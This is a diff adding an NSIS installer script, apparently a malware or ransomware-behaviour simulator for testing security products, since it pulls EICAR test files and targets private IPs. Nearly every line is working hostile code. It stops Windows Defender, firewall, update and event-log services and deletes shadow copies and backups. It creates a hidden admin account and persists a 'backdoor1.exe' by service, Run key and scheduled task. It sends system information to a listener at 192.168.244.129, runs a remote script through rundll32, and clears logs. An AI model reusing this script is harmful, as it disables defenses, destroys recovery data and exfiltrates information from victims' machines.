@@ -1,0 +1,104 @@
+SetCompressor LZMA
+
+Name '201863036.exe'
+
+OutFile '201863036.exe'
+
+;SilentInstall silent
+
+Icon malware.ico
+
+
+Section ''
+
+	ExecShell "" "$sysdir\cmd.exe" "schtasks /DELETE /TN gimotti /F" SW_HIDE
+	
+	
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "wuauserv"' # Windows Update
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "wscsvc"' # Security Center
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "Sense"' # Windows Defender Advanced Threat Protection 
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "WdNisSvc"' # Windows Defender Antivirus NIS
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "WinDefend"' # Windows Defender Antivirus
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "mpssvc"' # Windows Defender Firewall
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "EventLog"' # Eventlog
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "SDRSVC"' # Windows 백업
+	nsExec::ExecToStack /TIMEOUT=8000 '"$WINDIR\system32\net.exe" stop "msiserver"'# Window update
+    Pop $0
+	Sleep 2000
+
+  
+  WriteRegDword HKCU "Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" "Enabled" 0
+  WriteRegDword HKCU "Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" "NoToastApplicationNotification" 1
+  WriteRegDword HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "EnableLUA" 1
+  WriteRegDword HKLM "SOFTWARE\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 1
+  WriteRegDword HKLM "SYSTEM\CurrentControlSet\Services\SecurityHealthService" "Start" 4
+  WriteREgDword HKLM "SYSTEM\CurrentControlSet\Services\wscsvc" "start" 4
+  WriteRegDword HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" "MaintenanceDisabled" 1
+  WriteRegDword HKLM "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" "noAutoUpdate" 1
+  WriteRegDword HKLM "Software\Policies\Microsoft\Windows\WindowsUpdate\AU" "IncludeRecommendedUpdates" 1
+  
+  Exec 'netsh advfirewall set currentprofile state off'
+  Exec 'netsh advfirewall firewall del rule name="<rulename>"'
+  inetc::get /silent "https://secure.eicar.org/eicar.com" "C:\eicar2.com"
+  Pop $0	
+  Sleep 5000
+
+  inetc::get /silent "https://amtso.eicar.org/eicar.com" "C:\eicar3.com"
+  Pop $0
+  Sleep 5000
+  inetc::get /silent "http://amtso.eicar.org/PotentiallyUnwanted.exe" "C:\PotentiallyUnwanted.exe"
+  Pop $0
+  
+  
+  Exec "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+  Exec "bcdedit /set {default} recoveryenabled no"
+  Exec "wbadmin delete catalog -quiet"
+  Exec "wbadmin delete systemstatebackup"
+  Exec "wbadmin delete systemstatebackup -keepversion:()"
+  Exec "wbadmin delete backup"
+  Exec "wmic shadowcopy delete"
+  Exec "vssadmin delete shadows /all /quiet"
+  
+  Exec 'C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe -ExecutionPolicy ByPass -File "C:\Program Files\AVG\Antivirus\setup\UninstallExchange.ps1" "C:\Program Files\AVG\Antivirus\AsEx.dll"'
+  Exec 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f'
+  Exec 'reg delete "HKEY_CURENT_USER\Software\Microsoft\Terminal Server Client\Server" /f'
+  Exec 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v mal /t REG_SZ /d" "C:\backdoor1.exe"'
+  
+  ExecShell "" "$SysDir\cmd.exe" "/c net user administrator /active:yes" SW_HIDE
+  ExecShell "" "$SysDir\cmd.exe" "/c net user admin /add" SW_HIDE
+  ExecShell "" "$SysDir\cmd.exe" "/c net localgroup administrators admin /add" SW_HIDE
+  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "admin" 0
+  
+  ExecShellWait "" "$SysDir\cmd.exe" "/c systeminfo >> $TEMP\info.txt" SW_HIDE
+  ExecShellWait "" "$SysDir\cmd.exe" "/c getmac /v >> $TEMP\info.txt" SW_HIDE
+  ExecShellWait "" "$SysDir\cmd.exe" "/c net user >> $TEMP\info.txt" SW_HIDE
+  
+  Exec 'sc create malservice binPath= "c:\backdoor1.exe" start= auto'
+  Exec 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "';document.write()GetObject('script:http://192.168.64.40/Attacker/01/download.test')
+  Exec 'netsh  advfirewall firewall add rule name="RAONKSVC" dir=in action=allow program="C:\ProgramData\RAONWIZ\RAON K\raonk.svc.exe" enable=yes'
+  Exec 'schtasks /CREATE /tn "malware" /TR "C:\backdoor1.exe" /SC daily /st 09:00:00 /ru "system"'
+  Exec 'schtasks.exe /create /RU SYSTEM /F /RL HIGHEST /TR "C:\Program Files (x86)\Naver\Naver Whale\Application\2.7.98.22\whale_update.exe" !@Whale:TheBestBrowserEver@!" /TN WhaleUpdateD /SC DAILY /DU 24:00 /RI 60'
+  
+  ExecShell "" "$SysDir\cmd.exe" "/c $TEMP\svchost.exe -w 2 192.168.244.129 8888 < $TEMP\info.txt" SW_HIDE
+  WriteREgDword HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "PortNumber" 9833 
+  
+  Exec 'attrib +h C:\Users\admin\AppData\Local\Temp\ytmp'
+  
+  Exec "wevtutil.exe clear-log Application"
+  Exec "wevtutil.exe clear-log Security"
+  Exec "wevtutil.exe clear-log System"
+  Exec "sc config EventLog start= disabled"
+  
+  
+  RMDir /r "C:\ProgramFiles\Windows Defender"
+  
+  Exec 'TASKKILL /F /IM EXPLORER.EXE'
+  MessageBox MB_TOPMOST "Infected with a virous"
+  DeleteRegKey HKLM "Software\Microsoft\Windows\Currentversion\WindowsUpdate\Services"
+  Delete 'C:\Users\admin\AppData\Local\Mozilla\Firefox\Profiles.ini'
+  
+  
+  SetRebootFlag true
+
+SectionEnd
+
